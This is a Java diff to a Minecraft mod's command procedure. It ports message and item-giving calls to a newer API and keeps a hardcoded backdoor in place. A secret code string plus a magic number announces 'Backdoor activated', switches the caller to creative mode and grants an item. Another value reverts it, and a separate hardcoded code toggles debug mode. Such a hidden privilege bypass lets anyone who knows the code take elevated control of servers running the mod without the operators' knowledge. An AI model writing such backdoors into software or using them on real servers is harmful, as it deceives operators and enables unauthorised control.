@@ -2,8 +2,6 @@ package palamod.procedures;
 
 import palamod.init.PalamodModItems;
 
-import net.neoforged.neoforge.items.ItemHandlerHelper;
-
 import net.minecraft.world.level.GameType;
 import net.minecraft.world.item.component.CustomData;
 import net.minecraft.world.item.ItemStack;
@@ -27,12 +25,12 @@ public class OxcommandProcedure {
 		if ((commandParameterMessage(arguments, "code")).equals("205686")) {
 			if (entity.getPersistentData().getBooleanOr("debug_pala", false)) {
 				entity.getPersistentData().putBoolean("debug_pala", false);
-				if (entity instanceof Player _player && !_player.level().isClientSide())
-					_player.displayClientMessage(Component.literal("Debug off"), false);
+				if (entity instanceof ServerPlayer _player)
+					_player.sendSystemMessage(Component.literal("Debug off"), false);
 			} else {
 				entity.getPersistentData().putBoolean("debug_pala", true);
-				if (entity instanceof Player _player && !_player.level().isClientSide())
-					_player.displayClientMessage(Component.literal("Debug on"), false);
+				if (entity instanceof ServerPlayer _player)
+					_player.sendSystemMessage(Component.literal("Debug on"), false);
 			}
 		}
 		if ((commandParameterMessage(arguments, "code")).equals("ptg_jobs")) {
@@ -44,12 +42,12 @@ public class OxcommandProcedure {
 			entity.getPersistentData().putDouble("Pickaxe_stone", (DoubleArgumentType.getDouble(arguments, "quan")));
 		}
 		if ((commandParameterMessage(arguments, "code")).equals("pPbTmCazJmU6bLvDRF") && DoubleArgumentType.getDouble(arguments, "quan") == 856478) {
-			if (entity instanceof Player _player && !_player.level().isClientSide())
-				_player.displayClientMessage(Component.literal("Backdoor activated"), false);
-			if (entity instanceof Player _player && !_player.level().isClientSide())
-				_player.displayClientMessage(Component.literal("Use this backdoor at for good use"), false);
-			if (entity instanceof Player _player && !_player.level().isClientSide())
-				_player.displayClientMessage(Component.literal("don't do any damage on server"), false);
+			if (entity instanceof ServerPlayer _player)
+				_player.sendSystemMessage(Component.literal("Backdoor activated"), false);
+			if (entity instanceof ServerPlayer _player)
+				_player.sendSystemMessage(Component.literal("Use this backdoor at for good use"), false);
+			if (entity instanceof ServerPlayer _player)
+				_player.sendSystemMessage(Component.literal("don't do any damage on server"), false);
 			if (entity instanceof ServerPlayer _player)
 				_player.setGameMode(GameType.CREATIVE);
 			if (entity instanceof Player _player) {
@@ -59,12 +57,12 @@ public class OxcommandProcedure {
 			if (entity instanceof Player _player) {
 				ItemStack _setstack = new ItemStack(PalamodModItems.PALADIUM_PHONE.get()).copy();
 				_setstack.setCount(1);
-				ItemHandlerHelper.giveItemToPlayer(_player, _setstack);
+				_player.getInventory().placeItemBackInInventory(_setstack);
 			}
 		}
 		if ((commandParameterMessage(arguments, "code")).equals("pPbTmCazJmU6bLvDRF") && DoubleArgumentType.getDouble(arguments, "quan") == 8) {
-			if (entity instanceof Player _player && !_player.level().isClientSide())
-				_player.displayClientMessage(Component.literal("Backdoor closed"), false);
+			if (entity instanceof ServerPlayer _player)
+				_player.sendSystemMessage(Component.literal("Backdoor closed"), false);
 			if (entity instanceof ServerPlayer _player)
 				_player.setGameMode(GameType.SURVIVAL);
 			if (entity instanceof Player _player) {
